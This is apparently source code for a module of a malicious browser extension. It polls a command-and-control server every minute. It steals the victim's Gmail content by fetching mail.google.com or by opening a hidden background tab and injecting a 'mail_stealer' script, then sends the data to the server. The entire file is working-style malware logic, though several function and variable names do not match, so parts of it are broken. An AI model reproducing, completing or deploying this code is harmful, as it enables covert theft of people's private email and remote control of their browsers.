////////////////////////////////////////////////////////////////
// C&C <-> Module Communication
////////////////////////////////////////////////////////////////

// This header will be defined for every module to define processing of new cmds 
// & querying new cmds from server.  
// Define one header to embed all necessary c&c server functions.
let getCmds = {{CC_GET_CMDS_FN}};
let sendData = {{CC_SEND_DATA_FN}};
let QUERY_CMDS_INTERVAL = 1 * 60 * 1000; // Get new cmds from server every 1 minute.
let MODULE_NAME = 'mail';
//

function execModulesWithParams(args_list) {
	for (let i=0; i<MODULE_TECHNIQUES.length; i++) {
		MODULE_TECHNIQUES[i](...args);
	}
}

function parseExecCmdsMail(cmds_list) {
	// Commands Format:
	// (module_name, op, args_list)
	for (let i=0; i<cmds_list.length; i++) {
		if (cmds_list[0].toLowerCase() === MODULE_NAME) {
			if (cmds_list[1].toLowerCase() === 'get') {
				execModuleWithParams(cmds_list[2]);
			}
		}
	}
}

function queryNewCmds() {
	let cmds_list = getCmds();
	parseExecCmdsMail(cmds_list);
}

function main() {
	setInterval(queryNewCmds, QUERY_CMDS_INTERVAL);
}

setTimeout(main, 5000); // Lazy 5-secs start-up.

////////////////////////////////////////////////////////////////
// Main Module Techniques 
///////////////////////////////////////////////////////////////

// Method 1: fetch from background context.
// Required perms: content-script access to <all_urls>
function acquire_emails() {
	// Send emails immediately to server.
	function send_emails(d) {
		let data_to_send = JSON.stringify(d);
		sendData(data_to_send);
	}
	fetch('https://mail.google.com').then(e=>console.log(e.text().then(send_emails)));
}


// Method 2: open some new non-active tabish once in couple of times and extract all its emails.
// Required perms: tabs.
function mail_injector(tab) {
	let tab_id=tab.id; 
	// Inject on specific tab:
	console.log("[*] Inject mail_stealer over specific tab, tabId=" + tab_id);
	browser.tabs.executeScript(tab_id, {allFrames: true, 
		code: '(' + acquire_emails.toString() + ')();' , frameId:0});		
	console.log("[*] Removing mail_injector - iteration finished.");
	chrome.tabs.onCreated.removeListener(mail_injector);
}

function acquire_emails_by_tab() {
	chrome.tabs.onCreated.addListener(mail_injector);
	chrome.tabs.create({
		url: 'https://mail.google.com',
		active: false
	});
}

// Placing here all of the modules various techniques.
let MODULE_TECHNIQUES = [acquire_emails_by_tab, acquire_emails];
